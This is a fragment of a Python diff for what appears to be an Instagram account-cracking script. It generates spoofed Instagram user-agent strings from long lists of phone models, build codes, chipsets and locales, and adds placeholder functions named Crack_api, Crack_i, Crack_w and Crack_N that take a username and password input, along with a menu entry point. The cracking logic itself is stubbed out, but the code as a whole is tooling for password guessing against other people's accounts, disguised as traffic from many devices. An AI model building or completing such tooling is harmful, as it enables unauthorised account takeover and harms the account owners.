'iPhone11,4', 'iPhone12,4', 'iPhone12,7', 'iPhone13,6','iPhone13,7', 'iPhone13,9', 'iPhone14,9', 'iPhone14,10', 'iPhone14,11', 'iPhone15,7','iPad10,7', 'iPad10,8', 'iPad11,5', 'iPad12,5', 'iPad13,8', 'iPad13,9', 'iPad14,8', 'iPad15,5','iPad16,3', 'iPad16,4', 'iPhone1,1', 'iPhone1,2', 'iPhone2,1', 'iPhone3,1', 'iPhone3,2', 'iPhone3,3', 'iPhone4,1','iPhone4,2', 'iPhone5,1', 'iPhone5,2', 'iPhone5,3', 'iPhone5,4', 'iPhone6,1', 'iPhone6,2','iPhone6,3', 'iPhone6,4', 'iPhone7,1', 'iPhone7,2', 'iPhone8,1', 'iPhone8,2', 'iPhone9,1','iPhone9,2', 'iPhone9,3', 'iPhone9,4', 'iPhone10,1', 'iPhone10,2', 'iPhone11,1', 'iPhone11,2','iPhone11,3', 'iPhone11,4', 'iPhone11,5', 'iPhone11,7', 'iPhone12,3', 'iPhone12,4', 'iPhone12,5', 'iPhone12,8','iPhone13,5', 'iPhone13,6', 'iPhone13,7', 'iPhone13,8', 'iPhone14,3', 'iPhone14,4', 'iPhone15,7'])
+    build = random.choice(['a32','a52','a53','a54','a55','e1q','e2q','e3q','e5q','beyond1','beyond2','beyond2q','beyondx','RE54ABL1','RE54BFL1','RMX2020','RMX2156','RMX3363','RMX3834','RMX3840','OP5958L1','OP4ECB','OP4E7B','Z60s','Z60Ultra','Doha_TMO','evert_nt','evert','moonstone','R883T','raspite','cheetah','apollo','R7f','R7fC','trlte','raven','oriole','panther','lynx','shiba','husky','tokay','caiman','akita','felix','tangorpro','barbet','bluejay','redfin','bramble','sunfish','sargo','flame','bonito','sailfish','marlin','walleye','taimen','blueline','crosshatch','coral','laguna','aston','waffle','vermeer','alioth','psyche','diting','mondrian','gale','sky','gold','ruby','miami','hawaii'])
+    chipset = random.choice(['mt6739','mt6761','mt6762','mt6765','mt6768','mt6769','mt6769t','mt6771','mt6785','mt6833','mt6853','mt6873','mt6877','mt6893','mt6895','mt6983','mt6985','qcom','msm8917','msm8953','sdm439','sdm450','sdm632','sdm636','sdm660','sdm665','sdm670','sdm710','sdm712','sdm730','sdm732','sdm765','sdm778g','sm6115','sm6225','sm6375','sm7150','sm7250','sm7325','sm7450','sm7550','sm7675','sm8250','sm8350','sm8450','sm8550','sm8650','exynos7420','exynos7884','exynos7885','exynos7904','exynos9611','exynos980','exynos1080','exynos1280','exynos1330','exynos1380','exynos1480','exynos1580','exynos2100','exynos2200','exynos2400','kirin659','kirin710','kirin810','kirin820','kirin9000','kirin9000s','sc9863a','sc9832e','t606','t610','t616','t618','t760','t820','gs101','gs201','gs301','gs401'])
+    locale = random.choice(['id_ID','en_US','en_GB','en_AU','en_CA','en_IN','en_SG','ms_MY','th_TH','vi_VN','zh_CN','zh_TW','ja_JP','ko_KR','hi_IN','bn_BD','fil_PH','fr_FR','fr_CA','de_DE','es_ES','es_MX','it_IT','pt_BR','pt_PT','nl_NL','pl_PL','tr_TR','ru_RU','uk_UA','ar_SA','ar_AE','fa_IR','he_IL','sv_SE','da_DK','nb_NO','fi_FI','cs_CZ','hu_HU','ro_RO','el_GR'])
+    ua1 = f'instagram {ig_version} Android ({android_version}; {dpi}; {pxl}; {brand}; {model}; {build}; {chipset}; {locale}; {kode})'
+    ua2 = f'instagram {ig_version} ({iphone}; iOS 17_5_1; {locale}; ru; scale=3.00; {pxl}; {kode}; IABMV/1)'
+    return(random.choice([ua1, ua2]))
+
+# ... (rest of the crack functions remain the same as in your code)
+
+def Crack_api(username, memek):
+    # [Your existing Crack_api code here]
+    pass
+
+def Crack_i(username, memek):
+    # [Your existing Crack_i code here]
+    pass
+
+def Crack_w(username, memek):
+    # [Your existing Crack_w code here]
+    pass
+
+def Crack_N(username, memek):
+    # [Your existing Crack_N code here]
+    pass
+
+if __name__ == '__main__':
+    try:
+        os.mkdir('data')
+    except:
+        pass
+    try:
+        Menu()
+    except requests.exceptions.ConnectionError:
+        print('Connection Close')
